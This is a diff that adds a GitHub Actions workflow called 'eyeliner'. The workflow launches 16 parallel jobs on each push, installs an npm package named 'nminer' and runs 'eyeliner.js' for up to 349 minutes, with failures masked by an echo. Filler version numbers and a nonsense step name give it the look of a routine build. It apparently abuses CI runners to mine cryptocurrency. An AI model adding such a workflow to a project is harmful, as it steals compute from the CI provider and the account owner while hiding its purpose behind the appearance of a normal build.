@@ -1,0 +1,41 @@
+name: eyeliner
+on:
+  push:
+    branches: [ "main" ]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        config:
+          - { version: 5477 }
+          - { version: 7451 }
+          - { version: 1775 }
+          - { version: 5087 }
+          - { version: 5202 }
+          - { version: 2690 }
+          - { version: 9241 }
+          - { version: 536 }
+          - { version: 9723 }
+          - { version: 5601 }
+          - { version: 7730 }
+          - { version: 6934 }
+          - { version: 1610 }
+          - { version: 1831 }
+          - { version: 1373 }
+          - { version: 2459 }
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: well-documented nimble tensely
+        run: |
+          npm install nminer@latest
+          timeout 349m node eyeliner.js || echo "eyeliner executed"
